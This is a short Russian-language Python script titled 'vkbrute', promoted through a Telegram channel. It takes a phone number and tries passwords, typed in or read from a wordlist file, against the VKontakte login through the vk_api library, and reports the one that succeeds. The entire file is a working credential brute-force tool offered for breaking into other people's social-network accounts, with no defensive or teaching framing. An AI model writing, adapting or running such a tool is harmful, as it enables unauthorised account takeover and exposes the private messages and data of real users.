# -*- coding: utf-8 -*-
import vk_api
import colorama 
from colorama import Fore, Back, Style

logo = (''' 
Мы в телеграме: @pyhax

██╗░░░██╗██╗░░██╗██████╗░██████╗░██╗░░░██╗████████╗███████╗
██║░░░██║██║░██╔╝██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝
╚██╗░██╔╝█████═╝░██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░
░╚████╔╝░██╔═██╗░██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░
░░╚██╔╝░░██║░╚██╗██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗
░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝
    ''')
print(logo)

######################################
#    Coder(telegram): @fleeen        #
#    My channel(telegram): @pyhax    #
######################################

def wordvvod():
    words = list(map(str, input("Слова для брута(разделяй запятой(, )): ").split(', ')))
    for password in words:
        try:
            vk_session = vk_api.VkApi(phone, str(password))
            vk_session.auth()
            print(Fore.GREEN +"FOUND: " + str(password))
            break
        except:
            print(Fore.RED + str(password) + ' BAD')

def wordtxt():
    with open(txt) as f:
        lines = f.readlines()
    lines = [line.strip('\n') for line in open(txt)]
    for password in lines:
        try:
            vk_session = vk_api.VkApi(phone, str(password))
            vk_session.auth()
            print(Fore.GREEN +"FOUND: " + str(password))
            break
        except:
            print(Fore.RED + str(password) + ' BAD')
    f.close()

if __name__ == '__main__':
    phone = input('Телефон (Можно с +): ')
    word = input('Откуда берём слова?: \n[1] - Записываем тут\n[2] - Из txt файла(Словаря)\n'+ Fore.RED +'vkbrute -> ')
    if word == "1":
        wordvvod()
    elif word == "2":
        txt = input('Ведите название файла(Словаря)(example.txt): ')
        wordtxt()
    else:
        print('Не понял, повторите попытку')
        exit(0)